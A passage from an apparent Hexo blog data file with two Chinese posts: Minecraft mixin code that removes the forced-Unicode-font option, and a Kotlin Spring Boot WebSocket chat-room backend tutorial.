punctuation\">.</span>fonts<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FontResourceManager</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Final</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Mixin</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Overwrite</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Shadow</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * me.asgard.rain.afu.GameSettingMixin\n * AntiForceUnicode\n *\n * @author 寒雨\n * @since 2021/12/29 13:48\n **/</span>\n<span class=\"token annotation punctuation\">@Mixin</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Minecraft</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MinecraftMixin</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Final</span>\n    <span class=\"token annotation punctuation\">@Shadow</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">FontResourceManager</span> fontManager<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @author Rain\n     * @reason force disable force unicode\n     */</span>\n    <span class=\"token annotation punctuation\">@Overwrite</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isEnforceUnicode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @author Rain\n     * @reason force disable force unicode\n     */</span>\n    <span class=\"token annotation punctuation\">@Overwrite</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">selectMainFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">boolean</span> p_238209_1_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        fontManager<span class=\"token punctuation\">.</span><span class=\"token function\">setRenames</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ImmutableMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">of</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"坏黑的做法\"><a href=\"#坏黑的做法\" class=\"headerlink\" title=\"坏黑的做法\"></a>坏黑的做法</h3><p>写成一天后坏黑大概是来兴趣了，也写了一个</p>\n<p>他直接把那个选项的按钮删掉了。毫无疑问，这个做法更好</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">me<span class=\"token punctuation\">.</span>skymc<span class=\"token punctuation\">.</span>fsb<span class=\"token punctuation\">.</span>mixin</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AbstractOption</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>screen<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Screen</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Widget</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span>button<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">OptionButton</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Mixin</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">At</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Inject</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span>callback<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CallbackInfoReturnable</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * FSB\n * me.skymc.fsb.mixin.MixinScreenLanguage\n *\n * @author 坏黑\n * @since 2021/12/29 10:54 PM\n */</span>\n<span class=\"token annotation punctuation\">@Mixin</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Screen</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MixinLanguageScreen</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Inject</span><span class=\"token punctuation\">(</span>method <span class=\"token operator\">=</span> <span class=\"token string\">\"addButton\"</span><span class=\"token punctuation\">,</span> at <span class=\"token operator\">=</span> <span class=\"token annotation punctuation\">@At</span><span class=\"token punctuation\">(</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"HEAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> cancellable <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Widget</span><span class=\"token punctuation\">></span></span> <span class=\"token keyword\">void</span> <span class=\"token function\">addButton</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span> p_230480_1_<span class=\"token punctuation\">,</span> <span class=\"token class-name\">CallbackInfoReturnable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">></span></span> c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p_230480_1_ <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">OptionButton</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">OptionButton</span><span class=\"token punctuation\">)</span> p_230480_1_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getOption</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">AbstractOption</span><span class=\"token punctuation\">.</span>FORCE_UNICODE_FONT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            c<span class=\"token punctuation\">.</span><span class=\"token function\">setReturnValue</span><span class=\"token punctuation\">(</span>p_230480_1_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"Hello Spring Boot!","date":"2021-12-24T16:00:00.000Z","author":"寒雨","hide":false,"summary":"用spring boot简单的实现了路姐姐的聊天室后端","_content":"\n# Hello Spring Boot\n\n其实之前也有了解过其他的后端实现方式，比如Go的后端（还没学到怎么写接口就放弃了），Node.js的后端（还是整得稀里糊涂的），发现都学不太会。（其实是没时间去仔细琢磨，学习这些语言的后端同时也需要学习这些语言，学习成本较大）\n\n于是我还是选择了最传统的Spring Boot后端。不过我使用了我喜欢的Kotlin语言来编写，使用Gradle工具来管理依赖库。\n\n刚上手时便惊讶的发现，Spring Boot框架对java后端的封装真的特别彻底，基本就是几个注解便帮你处理了大部分工作，写起来真的特别的舒服。\n\n像这样便能实现一个简单的返回json信息的api接口\n\n~~~kotlin\n@RestController\nclass TestController {\n\n    @GetMapping(\"/greeting\")\n    fun greeting(@RequestParam(value = \"name\", defaultValue = \"World\") name: String) = BaseResponseBean(\"Hello $name\")\n\n}\n\ndata class BaseResponseBean<T>(\n    val data: T?,\n    val errorCode: Int = 0,\n    val errorMsg: String = \"\"\n)\n~~~\n\n然后我便想写个项目练练手，于是就想到了路姐姐的聊天室后端。路姐姐是用的TypeScript实现的聊天室后端，我便想用Spring Boot实现一个功能类似的。\n\n代码如下\n\n~~~kotlin\ndata class ChatWsMessageBean(\n    val type: String,\n    val username: String,\n    val data: String?,\n    val avatar: String\n)\n\nobject WebSocketMessageType {\n    const val OPEN = \"OPEN\"\n    const val CLOSE = \"CLOSE\"\n    const val MESSAGE = \"MESSAGE\"\n}\n\n@Component\nclass ChatRoomWsHandler : TextWebSocketHandler() {\n\n    private val objectMapper = ObjectMapper()\n    private val connectedSessions = arrayListOf<WebSocketSession>()\n\n    override fun afterConnectionEstablished(session: WebSocketSession) {\n        connectedSessions.add(session)\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach { it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.OPEN, username.toString(), null, avatar.toString()).stringify())) }\n        println(\"[ChatRoom] $username connect with avatar $avatar\")\n    }\n\n    override fun handleTextMessage(session: WebSocketSession, message: TextMessage) {\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach {\n            it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.MESSAGE, username.toString(),\n                message.payload, avatar.toString()).stringify()))\n        }\n        println(\"[ChatRoom] $username send message ${message.payload} with avatar $avatar\")\n    }\n\n    override fun afterConnectionClosed(session: WebSocketSession, closeStatus: CloseStatus) {\n        connectedSessions.remove(session)\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach { it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.CLOSE, username.toString(), null, avatar.toString()).stringify())) }\n        println(\"[ChatRoom] $username disconnect with avatar $avatar\")\n    }\n\n    private fun ChatWsMessageBean.stringify() = objectMapper.writeValueAsString(this)\n}\n\n@Configuration\n@EnableWebSocket\nclass WebSocketConfig : WebSocketConfigurer {\n\n    @Autowired\n    private lateinit var chatRoomWsHandler: ChatRoomWsHandler\n\n    override fun registerWebSocketHandlers(registry: WebSocketHandlerRegistry) {\n        registry.addHandler(chatRoomWsHandler, \"chatroom\")\n            .setAllowedOrigins(\"*\")\n    }\n}\n~~~\n\n对其效果个人还是非常满意的，改天有时间写一个Android端的聊天室\n\n在全栈的道路上越走越远XD","source":"_posts/hello-spring-boot.md","raw":"---\ntitle: Hello Spring Boot!\ndate: 2021-12-25\nauthor: 寒雨\nhide: false\nsummary: 用spring boot简单的实现了路姐姐的聊天室后端\ncategories: 杂谈\ntags:\n  - Kotlin\n  - SpringBoot\n  - 后端\n---\n\n# Hello Spring Boot\n\n其实之前也有了解过其他的后端实现方式，比如Go的后端（还没学到怎么写接口就放弃了），Node.js的后端（还是整得稀里糊涂的），发现都学不太会。（其实是没时间去仔细琢磨，学习这些语言的后端同时也需要学习这些语言，学习成本较大）\n\n于是我还是选择了最传统的Spring Boot后端。不过我使用了我喜欢的Kotlin语言来编写，使用Gradle工具来管理依赖库。\n\n刚上手时便惊讶的发现，Spring Boot框架对java后端的封装真的特别彻底，基本就是几个注解便帮你处理了大部分工作，写起来真的特别的舒服。\n\n像这样便能实现一个简单的返回json信息的api接口\n\n~~~kotlin\n@RestController\nclass TestController {\n\n    @GetMapping(\"/greeting\")\n    fun greeting(@RequestParam(value = \"name\", defaultValue = \"World\") name: String) = BaseResponseBean(\"Hello $name\")\n\n}\n\ndata class BaseResponseBean<T>(\n    val data: T?,\n    val errorCode: Int = 0,\n    val errorMsg: String = \"\"\n)\n~~~\n\n然后我便想写个项目练练手，于是就想到了路姐姐的聊天室后端。路姐姐是用的TypeScript实现的聊天室后端，我便想用Spring Boot实现一个功能类似的。\n\n代码如下\n\n~~~kotlin\ndata class ChatWsMessageBean(\n    val type: String,\n    val username: String,\n    val data: String?,\n    val avatar: String\n)\n\nobject WebSocketMessageType {\n    const val OPEN = \"OPEN\"\n    const val CLOSE = \"CLOSE\"\n    const val MESSAGE = \"MESSAGE\"\n}\n\n@Component\nclass ChatRoomWsHandler : TextWebSocketHandler() {\n\n    private val objectMapper = ObjectMapper()\n    private val connectedSessions = arrayListOf<WebSocketSession>()\n\n    override fun afterConnectionEstablished(session: WebSocketSession) {\n        connectedSessions.add(session)\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach { it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.OPEN, username.toString(), null, avatar.toString()).stringify())) }\n        println(\"[ChatRoom] $username connect with avatar $avatar\")\n    }\n\n    override fun handleTextMessage(session: WebSocketSession, message: TextMessage) {\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach {\n            it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.MESSAGE, username.toString(),\n                message.payload, avatar.toString()).stringify()))\n        }\n        println(\"[ChatRoom] $username send message ${message.payload} with avatar $avatar\")\n    }\n\n    override fun afterConnectionClosed(session: WebSocketSession, closeStatus: CloseStatus) {\n        connectedSessions.remove(session)\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach { it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.CLOSE, username.toString(), null, avatar.toString()).stringify())) }\n        println(\"[ChatRoom] $username disconnect with avatar $avatar\")\n    }\n\n    private fun ChatWsMessageBean.stringify() = objectMapper.writeValueAsString(this)\n}\n\n@Configuration\n@EnableWebSocket\nclass WebSocketConfig : WebSocketConfigurer {\n\n    @Autowired\n    private lateinit var chatRoomWsHandler: ChatRoomWsHandler\n\n    override fun registerWebSocketHandlers(registry: WebSocketHandlerRegistry) {\n        registry.addHandler(chatRoomWsHandler, \"chatroom\")\n            .setAllowedOrigins(\"*\")\n    }\n}\n~~~\n\n对其效果个人还是非常满意的，改天有时间写一个Android端的聊天室\n\n在全栈的道路上越走越远XD","slug":"hello-spring-boot","published":1,"updated":"2022-11-24T02:59:48.272Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jti0019sfklbmdg9mpg","content":"<h1 id=\"Hello-Spring-Boot\"><a href=\"#Hello-Spring-Boot\" class=\"headerlink\" title=\"Hello Spring Boot\"></a>Hello Spring Boot</h1><p>其实之前也有了解过其他的后端实现方式，比如Go的后端（还没学到怎么写接口就放弃了），Node.js的后端（还是整得稀里糊涂的），发现都学不太会。（其实是没时间去仔细琢磨，学习这些语言的后端同时也需要学习这些语言，学习成本较大）</p>\n<p>于是我还是选择了最传统的Spring Boot后端。不过我使用了我喜欢的Kotlin语言来编写，使用Gradle工具来管理依赖库。</p>\n<p>刚上手时便惊讶的发现，Spring Boot框架对java后端的封装真的特别彻底，基本就是几个注解便帮你处理了大部分工作，写起来真的特别的舒服。</p>\n<p>像这样便能实现一个简单的返回json信息的api接口</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@RestController</span>\n<span class=\"token keyword\">class</span> TestController <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation builtin\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/greeting\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">greeting</span><span class=\"token punctuation\">(</span><span class=\"token annotation builtin\">@RequestParam</span><span class=\"token punctuation\">(</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> defaultValue <span class=\"token operator\">=</span> <span class=\"token string\">\"World\"</span><span class=\"token punctuation\">)</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">BaseResponseBean</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello <span class=\"token interpolation variable\">$name</span>\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> BaseResponseBean<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> errorCode<span class=\"token operator\">:</span> Int <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> errorMsg<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后我便想写个项目练练手，于是就想到了路姐姐的聊天室后端。路姐姐是用的TypeScript实现的聊天室后端，我便想用Spring Boot实现一个功能类似的。</p>\n<p>代码如下</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword\">val</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> username<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> avatar<span class=\"token operator\">:</span> String\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">object</span> WebSocketMessageType <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> OPEN <span class=\"token operator\">=</span> <span class=\"token string\">\"OPEN\"</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> CLOSE <span class=\"token operator\">=</span> <span class=\"token string\">\"CLOSE\"</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> MESSAGE <span class=\"token operator\">=</span> <span class=\"token string\">\"MESSAGE\"</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token annotation builtin\">@Component</span>\n<span class=\"token keyword\">class</span> ChatRoomWsHandler <span class=\"token operator\">:</span> <span class=\"token function\">TextWebSocketHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> objectMapper <span class=\"token operator\">=</span> <span class=\"token function\">ObjectMapper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> connectedSessions <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>WebSocketSession<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">afterConnectionEstablished</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span> it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>OPEN<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> connect with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">handleTextMessage</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">,</span> message<span class=\"token operator\">:</span> TextMessage<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>MESSAGE<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                message<span class=\"token punctuation\">.</span>payload<span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> send message <span class=\"token interpolation\"><span class=\"token delimiter variable\">${</span>message<span class=\"token punctuation\">.</span>payload<span class=\"token delimiter variable\">}</span></span> with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">afterConnectionClosed</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">,</span> closeStatus<span class=\"token operator\">:</span> CloseStatus<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span> it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>CLOSE<span class=\"token punctuation\">,</span> username<span class=\"token 